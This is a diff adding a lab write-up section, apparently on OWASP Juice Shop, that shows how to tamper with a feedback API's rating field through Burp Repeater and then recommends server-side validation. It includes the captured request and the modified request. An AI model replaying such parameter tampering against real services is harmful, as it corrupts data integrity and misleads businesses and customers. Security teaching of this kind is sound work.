@@ -137,3 +137,113 @@ Does it belong to logged-in user?
 ```
 
 **Key point:** Never rely on the frontend to enforce access control. Authorization must be checked **server-side for every object/request**.
+
+Rating Manipulation
+
+Goal
+
+Test whether the feedback API allows a user to manipulate the rating value by modifying the request in Burp Suite.
+
+Step 1 — Capture Feedback Request
+
+Submit a feedback and intercept the request in Burp Suite → HTTP History.
+
+POST /api/Feedbacks/ HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Authorization: Bearer <YOUR_TOKEN>
+
+Request body:
+
+{
+  "UserId": 25,
+  "captchaId": 0,
+  "captcha": "11",
+  "comment": "good (***mail.com)",
+  "rating": 5
+}
+
+Step 2 — Modify the Rating
+
+Send the request to Burp Repeater.
+
+Change:
+
+"rating": 5
+
+to:
+
+"rating": 3
+
+Example:
+
+{
+  "UserId": 25,
+  "captchaId": 0,
+  "captcha": "11",
+  "comment": "good (***mail.com)",
+  "rating": 3
+}
+
+Step 3 — Verify the Response
+
+The server accepts the modified value and returns the updated rating:
+
+{
+  "status": "success",
+  "data": {
+    "id": 10,
+    "UserId": 25,
+    "comment": "good (***mail.com)",
+    "rating": 3
+  }
+}
+
+Attack Flow
+
+Submit Feedback
+      ↓
+Capture POST Request
+      ↓
+Burp Repeater
+      ↓
+Modify "rating"
+      ↓
+Send Request
+      ↓
+Server accepts modified rating
+
+Vulnerability
+
+Rating Manipulation / Improper Server-Side Validation
+
+The application accepts a client-controlled rating value without properly enforcing the intended business rules on the server.
+
+Impact
+
+An attacker may manipulate feedback ratings, resulting in:
+
+Incorrect review ratings
+
+Data integrity issues
+
+Manipulated customer feedback
+
+Misleading business information
+
+Security Fix
+
+Validate the rating on the server side and enforce authorization/business rules for every feedback operation.
+
+Client Request
+      ↓
+Server-side validation
+      ↓
+Authorization check
+      ↓
+Valid → Accept
+Invalid → Reject
+
+Key Takeaway
+
+Never trust client-controlled parameters. Validate and authorize sensitive values on the server side.
